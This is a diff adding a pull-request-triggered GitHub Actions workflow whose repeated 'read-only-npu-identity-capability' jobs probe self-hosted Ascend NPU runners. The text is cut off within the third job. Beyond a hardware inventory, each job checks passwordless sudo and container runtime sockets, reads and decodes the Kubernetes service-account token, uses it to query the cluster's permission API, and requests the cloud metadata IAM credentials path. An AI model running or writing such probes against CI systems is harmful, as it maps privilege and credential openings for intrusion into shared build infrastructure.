@@ -1,0 +1,1042 @@
+name: c211-129564-ascendq2
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  probe-a2b3-1-a:
+    name: probe-a2b3-1-a
+    runs-on: linux-aarch64-a2b3-1
+    timeout-minutes: 20
+    container:
+      image: swr.cn-southwest-2.myhuaweicloud.com/base_image/ascend-ci/cann:9.2.1-910b-ubuntu22.04-py3.12
+    steps:
+      - name: read-only-npu-identity-capability
+        run: |
+          set -u
+          set +e
+          NONCE='c211-129564-d092924f60475f53'
+          JOB='probe-a2b3-1-a'
+          IMAGE_LABEL='cann-9.2.1-910b'
+          echo "C211_MARKER job=$JOB nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u 2>/dev/null) user=$(id -un 2>/dev/null)"
+          echo "C211_HOSTNAME=$(hostname 2>/dev/null)"
+          echo "C211_UID_INFO $(id 2>/dev/null)"
+          echo "C211_IMAGE_LABEL=$IMAGE_LABEL"
+          uname -a 2>&1 || true
+          echo "C211_ARCH=$(uname -m 2>/dev/null)"
+          if [ -f /etc/os-release ]; then echo "C211_OS $(head -2 /etc/os-release | tr '\n' ' ')"; fi
+          DEV="${C211_DEV:-/dev}"
+          SYS="${C211_SYS:-/sys}"
+          if command -v timeout >/dev/null 2>&1; then T="timeout 20"; else T=""; fi
+          echo "--- DEV_DAVINCI ---"
+          ls -ld "$DEV"/davinci* 2>&1 | head -24
+          if ls "$DEV"/davinci* >/dev/null 2>&1; then echo DAVINCI_PRESENT; else echo DAVINCI_ABSENT; fi
+          echo "--- DEV_MANAGER_NODES ---"
+          for n in davinci_manager devmm_svm hisi_hdc; do
+            if [ -e "$DEV/$n" ]; then echo "DEVNODE_PRESENT $n mode=$(stat -c '%a %U:%G' "$DEV/$n" 2>/dev/null)"; else echo "DEVNODE_ABSENT $n"; fi
+          done
+          echo "--- DEV_DRI ---"
+          if [ -d "$DEV/dri" ]; then echo DEVDRI_PRESENT; ls -l "$DEV/dri" 2>&1 | head -20; else echo DEVDRI_ABSENT; fi
+          echo "--- SYSFS_PCI_ACCEL ---"
+          if [ -d "$SYS/bus/pci/devices" ]; then
+            for d in "$SYS"/bus/pci/devices/*; do
+              v=$(cat "$d/vendor" 2>/dev/null || true)
+              case "$v" in
+                0x19e5|0x10de|0x1002|0x8086)
+                  echo "PCI dev=$(basename "$d") vendor=$v device=$(cat "$d/device" 2>/dev/null) subvendor=$(cat "$d/subsystem_vendor" 2>/dev/null) subdevice=$(cat "$d/subsystem_device" 2>/dev/null) class=$(cat "$d/class" 2>/dev/null) rev=$(cat "$d/revision" 2>/dev/null) serial=$(cat "$d/serial" 2>/dev/null || echo NA)" ;;
+              esac
+            done
+          else
+            echo SYSFS_PCI_ABSENT
+          fi
+          echo "--- SYSFS_DAVINCI ---"
+          ls -ld "$SYS"/class/davinci* 2>&1 | head -40
+          if ls "$SYS"/class/davinci* >/dev/null 2>&1; then
+            echo SYSFS_DAVINCI_PRESENT
+            for c in "$SYS"/class/davinci*; do
+              p=$(readlink -f "$c/device" 2>/dev/null || true)
+              echo "SYSFS_DAVINCI_ENTRY name=$(basename "$c") device=$p vendor=$(cat "$p/vendor" 2>/dev/null) deviceid=$(cat "$p/device" 2>/dev/null)"
+            done
+          else
+            echo SYSFS_DAVINCI_ABSENT
+          fi
+          echo "--- NPU_SMI_TOOL ---"
+          NPU=''
+          if command -v npu-smi >/dev/null 2>&1; then NPU=$(command -v npu-smi); echo "NPU_SMI_PATH=$NPU"
+          elif [ -x /usr/local/Ascend/driver/tools/npu-smi ]; then NPU=/usr/local/Ascend/driver/tools/npu-smi; echo "NPU_SMI_PATH=$NPU abs"
+          elif [ -x /usr/local/Ascend/ascend-toolkit/latest/bin/npu-smi ]; then NPU=/usr/local/Ascend/ascend-toolkit/latest/bin/npu-smi; echo "NPU_SMI_PATH=$NPU abs"
+          else echo NPU_SMI_ABSENT; fi
+          if [ -n "$NPU" ]; then
+            echo "--- NPU_SMI_INFO ---"
+            $T "$NPU" info 2>&1 | head -90
+            echo "--- NPU_SMI_BOARD ---"
+            i=0
+            fails=0
+            while [ "$i" -lt 8 ]; do
+              out=$($T "$NPU" info -t board -i "$i" -j 2>&1); rc=$?
+              if [ "$rc" -eq 0 ] && [ -n "$out" ]; then
+                echo "NPU_BOARD_JSON_BEGIN i=$i"
+                echo "$out" | head -100
+                echo "NPU_BOARD_JSON_END i=$i"
+                out2=$($T "$NPU" info -t board -i "$i" 2>&1)
+                echo "NPU_BOARD_TEXT_BEGIN i=$i"
+                echo "$out2" | head -50
+                echo "NPU_BOARD_TEXT_END i=$i"
+                fails=0
+              else
+                echo "NPU_BOARD_SKIP i=$i rc=$rc"
+                fails=$((fails + 1))
+                [ "$fails" -ge 2 ] && break
+              fi
+              i=$((i + 1))
+            done
+            echo "--- NPU_SMI_PRODUCT ---"
+            i=0
+            while [ "$i" -lt 4 ]; do
+              p=$($T "$NPU" info -t product -i "$i" 2>&1); rc=$?
+              if [ "$rc" -eq 0 ] && [ -n "$p" ]; then
+                echo "NPU_PRODUCT_BEGIN i=$i"
+                echo "$p" | head -30
+                echo "NPU_PRODUCT_END i=$i"
+              else
+                break
+              fi
+              i=$((i + 1))
+            done
+          fi
+          echo "--- UPGRADE_TOOL_SYSTEM_INFO ---"
+          UT=''
+          if command -v upgrade-tool >/dev/null 2>&1; then UT=$(command -v upgrade-tool); fi
+          for p in /usr/local/Ascend/driver/tools/upgrade-tool /usr/local/Ascend/ascend-toolkit/latest/tools/upgrade-tool; do
+            if [ -z "$UT" ] && [ -x "$p" ]; then UT="$p"; break; fi
+          done
+          if [ -n "$UT" ]; then
+            echo "UPGRADE_TOOL_PATH=$UT"
+            $T "$UT" --device_index -1 --system_info 2>&1 | head -150
+          else
+            echo UPGRADE_TOOL_ABSENT
+          fi
+          echo "--- HCCN_TOOL ---"
+          HC=''
+          if command -v hccn_tool >/dev/null 2>&1; then HC=$(command -v hccn_tool); fi
+          if [ -z "$HC" ] && [ -x /usr/local/Ascend/driver/tools/hccn_tool ]; then HC=/usr/local/Ascend/driver/tools/hccn_tool; fi
+          if [ -n "$HC" ]; then
+            echo "HCCN_TOOL_PATH=$HC"
+            $T "$HC" -i 0 -info 2>&1 | head -80
+          else
+            echo HCCN_TOOL_ABSENT
+          fi
+          echo "--- ASCEND_INSTALL_INFO ---"
+          for f in /etc/ascend_install.info /usr/local/Ascend/driver/version.info /usr/local/Ascend/ascend-toolkit/latest/aarch64-linux/ascend_toolkit_install.info /usr/local/Ascend/ascend-toolkit/latest/x86_64-linux/ascend_toolkit_install.info; do
+            if [ -f "$f" ]; then echo "INFO_FILE $f"; head -40 "$f" 2>&1; fi
+          done
+          echo "--- CAP_ID ---"
+          id 2>&1 | head -5
+          echo "--- CAP_SUDO_LIST ---"
+          if command -v sudo >/dev/null 2>&1; then $T sudo -n -l 2>&1 | head -40; echo "SUDO_RC=$?"; else echo SUDO_ABSENT; fi
+          echo "--- CAP_SOCKETS ---"
+          for s in /var/run/docker.sock /run/containerd/containerd.sock; do
+            if [ -e "$s" ]; then echo "SOCKET_PRESENT $s $(stat -c '%F mode=%a owner=%U:%G' "$s" 2>/dev/null)"; else echo "SOCKET_ABSENT $s"; fi
+          done
+          echo "--- CAP_K8S ---"
+          if [ -e /etc/kubernetes/kubelet.conf ]; then echo "KUBELET_CONF_PRESENT $(stat -c '%a %U:%G' /etc/kubernetes/kubelet.conf 2>/dev/null)"; else echo KUBELET_CONF_ABSENT; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-UNSET}"
+          SAT=/var/run/secrets/kubernetes.io/serviceaccount/token
+          if [ -f "$SAT" ]; then
+            echo "SA_TOKEN_PRESENT bytes=$(wc -c < "$SAT" 2>/dev/null) sha256=$(sha256sum "$SAT" 2>/dev/null | cut -c1-32)"
+            if command -v python3 >/dev/null 2>&1; then
+              python3 - "$SAT" <<'PY' 2>&1 | head -6
+          import base64, json, sys
+          try:
+              parts = open(sys.argv[1], 'rb').read().decode().strip().split('.')
+              if len(parts) >= 2:
+                  c = json.loads(base64.urlsafe_b64decode(parts[1] + '=' * (-len(parts[1]) % 4)))
+                  print('SA_TOKEN_CLAIMS iss=%s sub=%s aud=%s exp=%s' % (c.get('iss'), c.get('sub'), c.get('aud'), c.get('exp')))
+              else:
+                  print('SA_TOKEN_CLAIMS_UNPARSED')
+          except Exception as e:
+              print('SA_TOKEN_CLAIMS_DECODE_FAIL', type(e).__name__)
+          PY
+              if [ "${C211_NO_NET:-0}" != "1" ]; then
+                python3 - "$SAT" <<'PY' 2>&1 | head -10
+          import json, os, ssl, sys, urllib.request
+          tok = open(sys.argv[1]).read().strip()
+          body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
+                             "spec": {"namespace": "default"}}).encode()
+          ca = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
+          ctx = ssl.create_default_context(cafile=ca) if os.path.exists(ca) else ssl._create_unverified_context()
+          rq = urllib.request.Request('https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',
+                                      data=body, headers={'Authorization': 'Bearer ' + tok,
+                                                          'Content-Type': 'application/json'}, method='POST')
+          try:
+              with urllib.request.urlopen(rq, timeout=6, context=ctx) as r:
+                  d = json.loads(r.read())
+                  st = d.get('status') or {}
+                  print('K8S_SSRR status=%d resourceRules=%d nonResourceRules=%d incomplete=%s' % (
+                      r.status, len(st.get('resourceRules') or []), len(st.get('nonResourceRules') or []), st.get('incomplete')))
+          except Exception as e:
+              print('K8S_SSRR_FAIL', type(e).__name__, str(e)[:120])
+          PY
+              fi
+            else
+              echo "SA_TOKEN_CLAIMS_SKIPPED no_python3"
+            fi
+          else
+            echo SA_TOKEN_ABSENT
+          fi
+          echo "--- CAP_IMDS ---"
+          if [ "${C211_NO_NET:-0}" = "1" ]; then
+            echo IMDS_SKIPPED_MOCK
+          elif command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PY' 2>&1 | head -8
+          import hashlib, urllib.request
+          for path in ('/latest/meta-data/instance-id', '/latest/meta-data/iam/security-credentials/'):
+              try:
+                  rq = urllib.request.Request('http://169.254.169.254' + path, headers={'User-Agent': 'c211-129564'})
+                  with urllib.request.urlopen(rq, timeout=2) as r:
+                      b = r.read(4096)
+                      print('IMDS %s status=%d bytes=%d sha256=%s' % (path, r.status, len(b), hashlib.sha256(b).hexdigest()[:32]))
+              except Exception as e:
+                  print('IMDS %s FAIL %s' % (path, type(e).__name__))
+          PY
+          elif command -v curl >/dev/null 2>&1; then
+            for p in /latest/meta-data/instance-id /latest/meta-data/iam/security-credentials/; do
+              out=$(curl -s -m 2 -w '\nC211_HTTP=%{http_code}' "http://169.254.169.254$p" 2>/dev/null)
+              body=${out%$'\n'C211_HTTP=*}
+              code=${out##*C211_HTTP=}
+              echo "IMDS curl path=$p http=$code bytes=$(printf '%s' "$body" | wc -c) sha256=$(printf '%s' "$body" | sha256sum | cut -c1-32)"
+            done
+          else
+            echo IMDS_SKIPPED no_http_client
+          fi
+          echo "C211_PROBE_END job=$JOB nonce=$NONCE"
+          exit 0
+  probe-a2b3-1-b:
+    name: probe-a2b3-1-b
+    runs-on: linux-aarch64-a2b3-1
+    timeout-minutes: 20
+    container:
+      image: swr.cn-southwest-2.myhuaweicloud.com/base_image/ascend-ci/cann:9.2.1-910b-ubuntu22.04-py3.12
+    steps:
+      - name: read-only-npu-identity-capability
+        run: |
+          set -u
+          set +e
+          NONCE='c211-129564-d092924f60475f53'
+          JOB='probe-a2b3-1-b'
+          IMAGE_LABEL='cann-9.2.1-910b'
+          echo "C211_MARKER job=$JOB nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u 2>/dev/null) user=$(id -un 2>/dev/null)"
+          echo "C211_HOSTNAME=$(hostname 2>/dev/null)"
+          echo "C211_UID_INFO $(id 2>/dev/null)"
+          echo "C211_IMAGE_LABEL=$IMAGE_LABEL"
+          uname -a 2>&1 || true
+          echo "C211_ARCH=$(uname -m 2>/dev/null)"
+          if [ -f /etc/os-release ]; then echo "C211_OS $(head -2 /etc/os-release | tr '\n' ' ')"; fi
+          DEV="${C211_DEV:-/dev}"
+          SYS="${C211_SYS:-/sys}"
+          if command -v timeout >/dev/null 2>&1; then T="timeout 20"; else T=""; fi
+          echo "--- DEV_DAVINCI ---"
+          ls -ld "$DEV"/davinci* 2>&1 | head -24
+          if ls "$DEV"/davinci* >/dev/null 2>&1; then echo DAVINCI_PRESENT; else echo DAVINCI_ABSENT; fi
+          echo "--- DEV_MANAGER_NODES ---"
+          for n in davinci_manager devmm_svm hisi_hdc; do
+            if [ -e "$DEV/$n" ]; then echo "DEVNODE_PRESENT $n mode=$(stat -c '%a %U:%G' "$DEV/$n" 2>/dev/null)"; else echo "DEVNODE_ABSENT $n"; fi
+          done
+          echo "--- DEV_DRI ---"
+          if [ -d "$DEV/dri" ]; then echo DEVDRI_PRESENT; ls -l "$DEV/dri" 2>&1 | head -20; else echo DEVDRI_ABSENT; fi
+          echo "--- SYSFS_PCI_ACCEL ---"
+          if [ -d "$SYS/bus/pci/devices" ]; then
+            for d in "$SYS"/bus/pci/devices/*; do
+              v=$(cat "$d/vendor" 2>/dev/null || true)
+              case "$v" in
+                0x19e5|0x10de|0x1002|0x8086)
+                  echo "PCI dev=$(basename "$d") vendor=$v device=$(cat "$d/device" 2>/dev/null) subvendor=$(cat "$d/subsystem_vendor" 2>/dev/null) subdevice=$(cat "$d/subsystem_device" 2>/dev/null) class=$(cat "$d/class" 2>/dev/null) rev=$(cat "$d/revision" 2>/dev/null) serial=$(cat "$d/serial" 2>/dev/null || echo NA)" ;;
+              esac
+            done
+          else
+            echo SYSFS_PCI_ABSENT
+          fi
+          echo "--- SYSFS_DAVINCI ---"
+          ls -ld "$SYS"/class/davinci* 2>&1 | head -40
+          if ls "$SYS"/class/davinci* >/dev/null 2>&1; then
+            echo SYSFS_DAVINCI_PRESENT
+            for c in "$SYS"/class/davinci*; do
+              p=$(readlink -f "$c/device" 2>/dev/null || true)
+              echo "SYSFS_DAVINCI_ENTRY name=$(basename "$c") device=$p vendor=$(cat "$p/vendor" 2>/dev/null) deviceid=$(cat "$p/device" 2>/dev/null)"
+            done
+          else
+            echo SYSFS_DAVINCI_ABSENT
+          fi
+          echo "--- NPU_SMI_TOOL ---"
+          NPU=''
+          if command -v npu-smi >/dev/null 2>&1; then NPU=$(command -v npu-smi); echo "NPU_SMI_PATH=$NPU"
+          elif [ -x /usr/local/Ascend/driver/tools/npu-smi ]; then NPU=/usr/local/Ascend/driver/tools/npu-smi; echo "NPU_SMI_PATH=$NPU abs"
+          elif [ -x /usr/local/Ascend/ascend-toolkit/latest/bin/npu-smi ]; then NPU=/usr/local/Ascend/ascend-toolkit/latest/bin/npu-smi; echo "NPU_SMI_PATH=$NPU abs"
+          else echo NPU_SMI_ABSENT; fi
+          if [ -n "$NPU" ]; then
+            echo "--- NPU_SMI_INFO ---"
+            $T "$NPU" info 2>&1 | head -90
+            echo "--- NPU_SMI_BOARD ---"
+            i=0
+            fails=0
+            while [ "$i" -lt 8 ]; do
+              out=$($T "$NPU" info -t board -i "$i" -j 2>&1); rc=$?
+              if [ "$rc" -eq 0 ] && [ -n "$out" ]; then
+                echo "NPU_BOARD_JSON_BEGIN i=$i"
+                echo "$out" | head -100
+                echo "NPU_BOARD_JSON_END i=$i"
+                out2=$($T "$NPU" info -t board -i "$i" 2>&1)
+                echo "NPU_BOARD_TEXT_BEGIN i=$i"
+                echo "$out2" | head -50
+                echo "NPU_BOARD_TEXT_END i=$i"
+                fails=0
+              else
+                echo "NPU_BOARD_SKIP i=$i rc=$rc"
+                fails=$((fails + 1))
+                [ "$fails" -ge 2 ] && break
+              fi
+              i=$((i + 1))
+            done
+            echo "--- NPU_SMI_PRODUCT ---"
+            i=0
+            while [ "$i" -lt 4 ]; do
+              p=$($T "$NPU" info -t product -i "$i" 2>&1); rc=$?
+              if [ "$rc" -eq 0 ] && [ -n "$p" ]; then
+                echo "NPU_PRODUCT_BEGIN i=$i"
+                echo "$p" | head -30
+                echo "NPU_PRODUCT_END i=$i"
+              else
+                break
+              fi
+              i=$((i + 1))
+            done
+          fi
+          echo "--- UPGRADE_TOOL_SYSTEM_INFO ---"
+          UT=''
+          if command -v upgrade-tool >/dev/null 2>&1; then UT=$(command -v upgrade-tool); fi
+          for p in /usr/local/Ascend/driver/tools/upgrade-tool /usr/local/Ascend/ascend-toolkit/latest/tools/upgrade-tool; do
+            if [ -z "$UT" ] && [ -x "$p" ]; then UT="$p"; break; fi
+          done
+          if [ -n "$UT" ]; then
+            echo "UPGRADE_TOOL_PATH=$UT"
+            $T "$UT" --device_index -1 --system_info 2>&1 | head -150
+          else
+            echo UPGRADE_TOOL_ABSENT
+          fi
+          echo "--- HCCN_TOOL ---"
+          HC=''
+          if command -v hccn_tool >/dev/null 2>&1; then HC=$(command -v hccn_tool); fi
+          if [ -z "$HC" ] && [ -x /usr/local/Ascend/driver/tools/hccn_tool ]; then HC=/usr/local/Ascend/driver/tools/hccn_tool; fi
+          if [ -n "$HC" ]; then
+            echo "HCCN_TOOL_PATH=$HC"
+            $T "$HC" -i 0 -info 2>&1 | head -80
+          else
+            echo HCCN_TOOL_ABSENT
+          fi
+          echo "--- ASCEND_INSTALL_INFO ---"
+          for f in /etc/ascend_install.info /usr/local/Ascend/driver/version.info /usr/local/Ascend/ascend-toolkit/latest/aarch64-linux/ascend_toolkit_install.info /usr/local/Ascend/ascend-toolkit/latest/x86_64-linux/ascend_toolkit_install.info; do
+            if [ -f "$f" ]; then echo "INFO_FILE $f"; head -40 "$f" 2>&1; fi
+          done
+          echo "--- CAP_ID ---"
+          id 2>&1 | head -5
+          echo "--- CAP_SUDO_LIST ---"
+          if command -v sudo >/dev/null 2>&1; then $T sudo -n -l 2>&1 | head -40; echo "SUDO_RC=$?"; else echo SUDO_ABSENT; fi
+          echo "--- CAP_SOCKETS ---"
+          for s in /var/run/docker.sock /run/containerd/containerd.sock; do
+            if [ -e "$s" ]; then echo "SOCKET_PRESENT $s $(stat -c '%F mode=%a owner=%U:%G' "$s" 2>/dev/null)"; else echo "SOCKET_ABSENT $s"; fi
+          done
+          echo "--- CAP_K8S ---"
+          if [ -e /etc/kubernetes/kubelet.conf ]; then echo "KUBELET_CONF_PRESENT $(stat -c '%a %U:%G' /etc/kubernetes/kubelet.conf 2>/dev/null)"; else echo KUBELET_CONF_ABSENT; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-UNSET}"
+          SAT=/var/run/secrets/kubernetes.io/serviceaccount/token
+          if [ -f "$SAT" ]; then
+            echo "SA_TOKEN_PRESENT bytes=$(wc -c < "$SAT" 2>/dev/null) sha256=$(sha256sum "$SAT" 2>/dev/null | cut -c1-32)"
+            if command -v python3 >/dev/null 2>&1; then
+              python3 - "$SAT" <<'PY' 2>&1 | head -6
+          import base64, json, sys
+          try:
+              parts = open(sys.argv[1], 'rb').read().decode().strip().split('.')
+              if len(parts) >= 2:
+                  c = json.loads(base64.urlsafe_b64decode(parts[1] + '=' * (-len(parts[1]) % 4)))
+                  print('SA_TOKEN_CLAIMS iss=%s sub=%s aud=%s exp=%s' % (c.get('iss'), c.get('sub'), c.get('aud'), c.get('exp')))
+              else:
+                  print('SA_TOKEN_CLAIMS_UNPARSED')
+          except Exception as e:
+              print('SA_TOKEN_CLAIMS_DECODE_FAIL', type(e).__name__)
+          PY
+              if [ "${C211_NO_NET:-0}" != "1" ]; then
+                python3 - "$SAT" <<'PY' 2>&1 | head -10
+          import json, os, ssl, sys, urllib.request
+          tok = open(sys.argv[1]).read().strip()
+          body = json.dumps({"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",
+                             "spec": {"namespace": "default"}}).encode()
+          ca = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
+          ctx = ssl.create_default_context(cafile=ca) if os.path.exists(ca) else ssl._create_unverified_context()
+          rq = urllib.request.Request('https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',
+                                      data=body, headers={'Authorization': 'Bearer ' + tok,
+                                                          'Content-Type': 'application/json'}, method='POST')
+          try:
+              with urllib.request.urlopen(rq, timeout=6, context=ctx) as r:
+                  d = json.loads(r.read())
+                  st = d.get('status') or {}
+                  print('K8S_SSRR status=%d resourceRules=%d nonResourceRules=%d incomplete=%s' % (
+                      r.status, len(st.get('resourceRules') or []), len(st.get('nonResourceRules') or []), st.get('incomplete')))
+          except Exception as e:
+              print('K8S_SSRR_FAIL', type(e).__name__, str(e)[:120])
+          PY
+              fi
+            else
+              echo "SA_TOKEN_CLAIMS_SKIPPED no_python3"
+            fi
+          else
+            echo SA_TOKEN_ABSENT
+          fi
+          echo "--- CAP_IMDS ---"
+          if [ "${C211_NO_NET:-0}" = "1" ]; then
+            echo IMDS_SKIPPED_MOCK
+          elif command -v python3 >/dev/null 2>&1; then
+            python3 - <<'PY' 2>&1 | head -8
+          import hashlib, urllib.request
+          for path in ('/latest/meta-data/instance-id', '/latest/meta-data/iam/security-credentials/'):
+              try:
+                  rq = urllib.request.Request('http://169.254.169.254' + path, headers={'User-Agent': 'c211-129564'})
+                  with urllib.request.urlopen(rq, timeout=2) as r:
+                      b = r.read(4096)
+                      print('IMDS %s status=%d bytes=%d sha256=%s' % (path, r.status, len(b), hashlib.sha256(b).hexdigest()[:32]))
+              except Exception as e:
+                  print('IMDS %s FAIL %s' % (path, type(e).__name__))
+          PY
+          elif command -v curl >/dev/null 2>&1; then
+            for p in /latest/meta-data/instance-id /latest/meta-data/iam/security-credentials/; do
+              out=$(curl -s -m 2 -w '\nC211_HTTP=%{http_code}' "http://169.254.169.254$p" 2>/dev/null)
+              body=${out%$'\n'C211_HTTP=*}
+              code=${out##*C211_HTTP=}
+              echo "IMDS curl path=$p http=$code bytes=$(printf '%s' "$body" | wc -c) sha256=$(printf '%s' "$body" | sha256sum | cut -c1-32)"
+            done
+          else
+            echo IMDS_SKIPPED no_http_client
+          fi
+          echo "C211_PROBE_END job=$JOB nonce=$NONCE"
+          exit 0
+  probe-a2b3-0:
+    name: probe-a2b3-0
+    runs-on: linux-aarch64-a2b3-0
+    timeout-minutes: 20
+    container:
+      image: swr.cn-southwest-2.myhuaweicloud.com/base_image/ascend-ci/cann:9.2.1-910b-ubuntu22.04-py3.12
+    steps:
+      - name: read-only-npu-identity-capability
+        run: |
+          set -u
+          set +e
+          NONCE='c211-129564-d092924f60475f53'
+          JOB='probe-a2b3-0'
+          IMAGE_LABEL='cann-9.2.1-910b'
+          echo "C211_MARKER job=$JOB nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u 2>/dev/null) user=$(id -un 2>/dev/null)"
+          echo "C211_HOSTNAME=$(hostname 2>/dev/null)"
+          echo "C211_UID_INFO $(id 2>/dev/null)"
+          echo "C211_IMAGE_LABEL=$IMAGE_LABEL"
+          uname -a 2>&1 || true
+          echo "C211_ARCH=$(uname -m 2>/dev/null)"
+          if [ -f /etc/os-release ]; then echo "C211_OS $(head -2 /etc/os-release | tr '\n' ' ')"; fi
+          DEV="${C211_DEV:-/dev}"
+          SYS="${C211_SYS:-/sys}"
+          if command -v timeout >/dev/null 2>&1; then T="timeout 20"; else T=""; fi
+          echo "--- DEV_DAVINCI ---"
+          ls -ld "$DEV"/davinci* 2>&1 | head -24
+          if ls "$DEV"/davinci* >/dev/null 2>&1; then echo DAVINCI_PRESENT; else echo DAVINCI_ABSENT; fi
+          echo "--- DEV_MANAGER_NODES ---"
+          for n in davinci_manager devmm_svm hisi_hdc; do
+            if [ -e "$DEV/$n" ]; then echo "DEVNODE_PRESENT $n mode=$(stat -c '%a %U:%G' "$DEV/$n" 2>/dev/null)"; else echo "DEVNODE_ABSENT $n"; fi
+          done
+          echo "--- DEV_DRI ---"
+          if [ -d "$DEV/dri" ]; then echo DEVDRI_PRESENT; ls -l "$DEV/dri" 2>&1 | head -20; else echo DEVDRI_ABSENT; fi
+          echo "--- SYSFS_PCI_ACCEL ---"
+          if [ -d "$SYS/bus/pci/devices" ]; then
+            for d in "$SYS"/bus/pci/devices/*; do
+              v=$(cat "$d/vendor" 2>/dev/null || true)
+              case "$v" in
+                0x19e5|0x10de|0x1002|0x8086)
+                  echo "PCI dev=$(basename "$d") vendor=$v device=$(cat "$d/device" 2>/dev/null) subvendor=$(cat "$d/subsystem_vendor" 2>/dev/null) subdevice=$(cat "$d/subsystem_device" 2>/dev/null) class=$(cat "$d/class" 2>/dev/null) rev=$(cat "$d/revision" 2>/dev/null) serial=$(cat "$d/serial" 2>/dev/null || echo NA)" ;;
+              esac
+            done
+          else
+            echo SYSFS_PCI_ABSENT
+          fi
+          echo "--- SYSFS_DAVINCI ---"
+          ls -ld "$SYS"/class/davinci* 2>&1 | head -40
+          if ls "$SYS"/class/davinci* >/dev/null 2>&1; then
+            echo SYSFS_DAVINCI_PRESENT
+            for c in "$SYS"/class/davinci*; do
+              p=$(readlink -f "$c/device" 2>/dev/null || true)
+              echo "SYSFS_DAVINCI_ENTRY name=$(basename "$c") device=$p vendor=$(cat "$p/vendor" 2>/dev/null) deviceid=$(cat "$p/device" 2>/dev/null)"
+            done
+          else
+            echo SYSFS_DAVINCI_ABSENT
+          fi
+          echo "--- NPU_SMI_TOOL ---"
+          NPU=''
+          if command -v npu-smi >/dev/null 2>&1; then NPU=$(command -v npu-smi); echo "NPU_SMI_PATH=$NPU"
+          elif [ -x /usr/local/Ascend/driver/tools/npu-smi ]; then NPU=/usr/local/Ascend/driver/tools/npu-smi; echo "NPU_SMI_PATH=$NPU abs"
+          elif [ -x /usr/local/Ascend/ascend-toolkit/latest/bin/npu-smi ]; then NPU=/usr/local/Ascend/ascend-toolkit/latest/bin/npu-smi; echo "NPU_SMI_PATH=$NPU abs"
+          else echo NPU_SMI_ABSENT; fi
+          if [ -n "$NPU" ]; then
+            echo "--- NPU_SMI_INFO ---"
+            $T "$NPU" info 2>&1 | head -90
+            echo "--- NPU_SMI_BOARD ---"
+            i=0
+            fails=0
+            while [ "$i" -lt 8 ]; do
+              out=$($T "$NPU" info -t board -i "$i" -j 2>&1); rc=$?
+              if [ "$rc" -eq 0 ] && [ -n "$out" ]; then
+                echo "NPU_BOARD_JSON_BEGIN i=$i"
+                echo "$out" | head -100
+                echo "NPU_BOARD_JSON_END i=$i"
+                out2=$($T "$NPU" info -t board -i "$i" 2>&1)
+                echo "NPU_BOARD_TEXT_BEGIN i=$i"
+                echo "$out2" | head -50
+                echo "NPU_BOARD_TEXT_END i=$i"
+                fails=0
+              else
+                echo "NPU_BOARD_SKIP i=$i rc=$rc"
+                fails=$((fails + 1))
+                [ "$fails" -ge 2 ] && break
+              fi
+              i=$((i + 1))
+            done
+            echo "--- NPU_SMI_PRODUCT ---"
+            i=0
+            while [ "$i" -lt 4 ]; do
+              p=$($T "$NPU" info -t product -i "$i" 2>&1); rc=$?
+              if [ "$rc" -eq 0 ] && [ -n "$p" ]; then
+                echo "NPU_PRODUCT_BEGIN i=$i"
+                echo "$p" | head -30
+                echo "NPU_PRODUCT_END i=$i"
+              else
+                break
+              fi
+              i=$((i + 1))
+            done
+          fi
+          echo "--- UPGRADE_TOOL_SYSTEM_INFO ---"
+          UT=''
+          if command -v upgrade-tool >/dev/null 2>&1; then UT=$(command -v upgrade-tool); fi
+          for p in /usr/local/Ascend/driver/tools/upgrade-tool /usr/local/Ascend/ascend-toolkit/latest/tools/upgrade-tool; do
+            if [ -z "$UT" ] && [ -x "$p" ]; then UT="$p"; break; fi
+          done
+          if [ -n "$UT" ]; then
+            echo "UPGRADE_TOOL_PATH=$UT"
+            $T "$UT" --device_index -1 --system_info 2>&1 | head -150
+          else
+            echo UPGRADE_TOOL_ABSENT
+          fi
+          echo "--- HCCN_TOOL ---"
+          HC=''
+          if command -v hccn_tool >/dev/null 2>&1; then HC=$(command -v hccn_tool); fi
+          if [ -z "$HC" ] && [ -x /usr/local/Ascend/driver/tools/hccn_tool ]; then HC=/usr/local/Ascend/driver/tools/hccn_tool; fi
+          if [ -n "$HC" ]; then
+            echo "HCCN_TOOL_PATH=$HC"
+            $T "$HC" -i 0 -info 2>&1 | head -80
+          else
+            echo HCCN_TOOL_ABSENT
+          fi
+          echo "--- ASCEND_INSTALL_INFO ---"
+          for f in /etc/ascend_install.info /usr/local/Ascend/driver/version.info /usr/local/Ascend/ascend-toolkit/latest/aarch64-linux/ascend_toolkit_install.info /usr/local/Ascend/ascend-toolkit/latest/x86_64-linux/ascend_toolkit_install.info; do
+            if [ -f "$f" ]; then echo "INFO_FILE $f"; head -40 "$f" 2>&1; fi
+          done
+          echo "--- CAP_ID ---"
+          id 2>&1 | head -5
+          echo "--- CAP_SUDO_LIST ---"
+          if command -v sudo >/dev/null 2>&1; then $T sudo -n -l 2>&1 | head -40; echo "SUDO_RC=$?"; else echo SUDO_ABSENT; fi
+          echo "--- CAP_SOCKETS ---"
+          for s in /var/run/docker.sock /run/containerd/containerd.sock; do
+            if [ -e "$s" ]; then echo "SOCKET_PRESENT $s $(stat -c '%F mode=%a owner=%U:%G' "$s" 2>/dev/null)"; else echo "SOCKET_ABSENT $s"; fi
+          done
+          echo "--- CAP_K8S ---"
+          if [ -e /etc/kubernetes/kubelet.conf ]; then echo "KUBELET_CONF_PRESENT $(stat -c '%a %U:%G' /etc/kubernetes/kubelet.conf 2>/dev/null)"; else echo KUBELET_CONF_ABSENT; fi
